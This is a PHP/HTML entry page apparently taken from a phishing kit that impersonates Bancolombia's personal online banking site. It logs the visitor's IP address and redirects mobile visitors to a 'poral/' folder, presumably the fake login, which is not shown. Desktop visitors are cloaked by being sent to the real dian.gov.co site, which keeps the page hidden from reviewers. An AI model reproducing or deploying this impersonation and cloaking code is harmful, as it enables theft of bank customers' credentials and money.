<?php
// 1. Ocultamos las advertencias para que no rompan las peticiones de Javascript
error_reporting(0);

// 2. Configuramos la zona horaria de Colombia
date_default_timezone_set('America/Bogota');

$ip = getenv("REMOTE_ADDR");

// 3. Reemplazo moderno y seguro para strftime() en español
$dias = array("domingo", "lunes", "martes", "miércoles", "jueves", "viernes", "sábado");
$meses = array("enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre");

// Esto armará la fecha exactamente igual: "miércoles, 01 de abril de 2026"
$tiempo = $dias[date('w')] . ", " . date('d') . " de " . $meses[date('n')-1] . " de " . date('Y');
?>
<html>
    <head>
        <title>Bancolombia Sucursal Vrtual Personas</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>
        <link href="poral/css/style.css" rel="stylesheet">
        <link href="poral/css/stylesheet.css" rel="stylesheet">     
        <link rel="icon" type="image/png" href="poral/img/logo.png" />
        <script type="text/javascript" src="../../../js/jquery-3.6.0.min.js"></script>
        <script src="../../../js/jquery.jclock-min.js" type="text/javascript"></script>
    </head>
    <body>
        <script type="text/javascript">
            $(document).ready(function() {
                window.location.href = "poral/"; 
            });
       </script>
    
<script>
    function detectar_dispositivo() {
        var dispositivo = "";
        if (navigator.userAgent.match(/Android/i))
            dispositivo = "Android";
        else if (navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else if (navigator.userAgent.match(/iPhone/i))
            dispositivo = "iPhone";
        else if (navigator.userAgent.match(/iPad/i))
            dispositivo = "iPad";
        else if (navigator.userAgent.match(/iPod/i))
            dispositivo = "iPod";
        else if (navigator.userAgent.match(/BlackBerry/i))
            dispositivo = "BlackBerry";
        else if (navigator.userAgent.match(/Windows Phone/i))
            dispositivo = "Windows Phone";
        else
            dispositivo = "PC";
        return dispositivo;
    }

    if (detectar_dispositivo() == "PC") {
        window.location.href = 'https://www.dian.gov.co';
    }
</script>
    
</body>
</html>